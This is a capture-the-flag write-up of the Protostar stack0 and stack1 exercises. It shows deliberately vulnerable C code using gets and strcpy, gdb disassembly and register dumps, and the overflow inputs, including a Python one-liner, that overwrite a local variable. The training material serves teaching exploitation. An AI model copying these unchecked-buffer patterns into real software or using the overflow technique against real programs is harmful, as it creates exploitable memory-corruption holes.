# protostar_writeups

stack0 :
   
   Source code fir this challenge is 
   ```
    #include <stdlib.h>
    #include <unistd.h>
    #include <stdio.h>

    int main(int argc, char **argv)
    {
      volatile int modified;
      char buffer[64];

      modified = 0;
      gets(buffer);

      if(modified != 0) {
          printf("you have changed the 'modified' variable\n");
      } else {
          printf("Try again?\n");
      }
    }
   ```
   
   We need to change the integer called modified to something that is not zero.
   
   run stack0 in gdb and disassemble main
   
   ```
   (gdb) disassemble main
Dump of assembler code for function main:
0x080483f4 <main+0>:    push   ebp
0x080483f5 <main+1>:    mov    ebp,esp
0x080483f7 <main+3>:    and    esp,0xfffffff0
0x080483fa <main+6>:    sub    esp,0x60
0x080483fd <main+9>:    mov    DWORD PTR [esp+0x5c],0x0               
0x08048405 <main+17>:   lea    eax,[esp+0x1c]
0x08048409 <main+21>:   mov    DWORD PTR [esp],eax
0x0804840c <main+24>:   call   0x804830c <gets@plt>
0x08048411 <main+29>:   mov    eax,DWORD PTR [esp+0x5c]               ; modified is loaded onto eax
0x08048415 <main+33>:   test   eax,eax                                ; test if eax is 0
0x08048417 <main+35>:   je     0x8048427 <main+51>
0x08048419 <main+37>:   mov    DWORD PTR [esp],0x8048500
0x08048420 <main+44>:   call   0x804832c <puts@plt>
0x08048425 <main+49>:   jmp    0x8048433 <main+63>
0x08048427 <main+51>:   mov    DWORD PTR [esp],0x8048529
0x0804842e <main+58>:   call   0x804832c <puts@plt>
0x08048433 <main+63>:   leave
0x08048434 <main+64>:   ret
End of assembler dump.
   ```
   
   Variable can be changed if we give any input with length > 64 and "modified" will be overwritten by next 4 bytes. Construct a payload with 64*'A' and 4 'B'(this is just to ensure that we have control over the variable). break at 0x08048417 to check if we have control over modified variable. Using the payload mentioned above(64*'A'+4*'B') eax should have a value of 0x42424242(nothing but BBBB)
   
   ```
   End of assembler dump.                                                                  
(gdb) b *0x08048417                                                                     
Breakpoint 1 at 0x8048417: file stack0/stack0.c, line 13.                               
(gdb) r < /tmp/s0.txt                                                                   
Starting program: /opt/protostar/bin/stack0 < /tmp/s0.txt                               
                                                                                        
Breakpoint 1, 0x08048417 in main (argc=1, argv=0xbffff864) at stack0/stack0.c:13        
13      stack0/stack0.c: No such file or directory.                                     
        in stack0/stack0.c                                                              
(gdb) i r                                                                               
eax            0x42424242       1111638594                                              
ecx            0xbffff76c       -1073744020                                             
edx            0xb7fd9334       -1208118476                                             
ebx            0xb7fd7ff4       -1208123404                                             
esp            0xbffff750       0xbffff750                                              
ebp            0xbffff7b8       0xbffff7b8                                              
esi            0x0      0                                                               
edi            0x0      0                                                               
eip            0x8048417        0x8048417 <main+35>                                     
eflags         0x200206 [ PF IF ID ]                                                    
cs             0x73     115                                                             
ss             0x7b     123                                                             
ds             0x7b     123                                                             
es             0x7b     123                                                             
fs             0x0      0                                                               
gs             0x33     51                                                              
(gdb)                                                                                   
   ```
   eax has changed to 0x42424242 thus overwrote "modified" 
   ```
   user@protostar:/opt/protostar/bin$ ./stack0 < /tmp/s0.txt
   you have changed the 'modified' variable
   ```
   
Stack1 :

  Same as stack0. Only difference is it requires an argument instead of input.Here strcpy copies argv[1] to buffer. strcpy doesn't check for length of buffer so it will continue writing to the buffer until it finds a null byte. So it can overwrite modified.  
  ```
  #include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}

  ```
   Since we already have control over "modified"("BBBB" in stack0) we just need to replace "BBBB" with "dcba ==>(0x64636261)". Since the machine islittle endian the order should be reversed.
   
   
   ```
   user@protostar:/opt/protostar/bin$ ./stack1 $(python -c "print 'A' *64 +'dcba'")
   you have correctly got the variable to the right value
   ```
